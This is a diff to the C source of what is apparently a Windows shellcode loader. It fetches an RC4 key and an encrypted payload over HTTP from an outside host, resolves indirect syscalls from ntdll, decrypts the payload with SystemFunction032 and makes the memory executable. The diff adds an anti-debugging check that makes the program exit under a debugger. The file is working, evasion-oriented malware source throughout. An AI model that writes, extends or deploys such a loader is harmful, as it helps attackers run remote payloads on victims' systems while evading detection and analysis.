@@ -4,14 +4,14 @@
 #include <stdio.h>
 #include <string.h>
 #include "define.h"
+#include "PEBParsing.h"
 
 #pragma comment(lib, "Ws2_32.lib")
 
 //#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
 #define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )
 
-size_t szCalc;
-size_t szKey;
+//#define TEST 1;
 
 SystemFunction032 jodRC4;
 
@@ -93,10 +93,8 @@ void Populate() {
 	NtAllocateVirtualMemoryExSSN = GetSSN(hNtdll, "NtAllocateVirtualMemoryEx");
 	NtProtectVirtualMemorySSN = GetSSN(hNtdll, "NtProtectVirtualMemory");
 
-
 	NtAllocateVirtualMemoryExSyscall = GetSyscallAdr(hNtdll, "NtAllocateVirtualMemoryEx");
 	NtProtectVirtualMemorySyscall = GetSyscallAdr(hNtdll, "NtProtectVirtualMemory");
-
 
 	jodRC4 = (SystemFunction032)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction032");
 }
@@ -222,8 +220,6 @@ void PopulateData(char* host, char* port, char* LocKey, char* LocCipher) {
 
 	DownloadHttpToMemory(host,port, URL, &rc4Key);
 	DownloadHttpToMemory(host,port, cURL, &cipher);
-	szCalc = cipher.size;
-	szKey = rc4Key.size;
 }
 
 int main(int argc, char* argv[]) {
@@ -236,6 +232,12 @@ int main(int argc, char* argv[]) {
 	if (argc < 4) {
 #if _DEBUG
 		ok("Will have to pull from code ugh");
+#if TEST
+		if (isdebugging_x64()) {
+			printf("Its debugging nvm");
+			return 1;
+		}
+#endif
 		char* host = "127.0.0.1";
 		char* port = "8080";
 		char LocKey[] = "key.bin";
@@ -248,6 +250,11 @@ int main(int argc, char* argv[]) {
 #endif
 	}
 	else {
+
+		if (isdebugging_x64()) {
+			return 1;
+		}
+
 		host = argv[1];
 		port = argv[2];
 		LocKey = argv[3];
@@ -271,8 +278,8 @@ int main(int argc, char* argv[]) {
 		ok("Memory Allocated at 0x%p", &rBuffer);
 	}
 
-	ustring Key = { (DWORD)szKey, (DWORD)szKey, rc4Key.data };
-	ustring shellBuff = { (DWORD)szCalc,(DWORD)szCalc, cipher.data };
+	ustring Key = { (DWORD)rc4Key.size, (DWORD)rc4Key.size, rc4Key.data };
+	ustring shellBuff = { (DWORD)cipher.size,(DWORD)cipher.size, cipher.data };
 	jodRC4(&shellBuff, &Key);
 
 	if (sz > cipher.size) {
@@ -284,7 +291,7 @@ int main(int argc, char* argv[]) {
 	}
 
 	ULONG old;
-	ntError = NtProtectVirtualMemory(hProcess, &rBuffer, &szCalc, PAGE_EXECUTE_READ, &old);
+	ntError = NtProtectVirtualMemory(hProcess, &rBuffer, &cipher.size, PAGE_EXECUTE_READ, &old);
 	if (ntError != STATUS_SUCCESS) {
 		error("Could not change memory protections");
 		yolo();
